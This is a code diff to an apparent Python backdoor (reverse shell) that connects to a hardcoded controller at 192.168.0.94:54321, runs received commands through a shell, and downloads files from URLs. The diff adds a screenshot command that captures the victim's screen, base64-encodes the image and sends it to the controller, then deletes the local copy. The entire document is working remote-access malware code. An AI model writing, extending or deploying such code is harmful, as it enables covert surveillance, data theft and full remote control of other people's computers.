@@ -9,6 +9,7 @@ import base64
 import shutil
 import time
 import requests
+from mss import mss
 
 HOST = '192.168.0.94'
 PORT = 54321
@@ -30,6 +31,11 @@ def reliable_recv(_s):
             return json.loads(data)
         except ValueError:
             continue
+
+
+def screenshot():
+    with mss() as ss:
+        ss.shot()
 
 
 def download(url):
@@ -82,6 +88,14 @@ def shell(_s):
                 reliable_send(_s, '[+] Downloaded File from the specified URL!')
             except:
                 reliable_send(_s, '[!] Failed to Download the File from the specified URL!')
+        elif cmd[:10] == 'screenshot':
+            try:
+                screenshot()
+                with open('monitor-1.png', 'rb') as sc:
+                    reliable_send(_s, base64.b64encode(sc.read()))
+                os.remove('monitor-1.png')
+            except:
+                reliable_send(_s, '[!] Failed to take the screenshot!!')
         else:
             proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
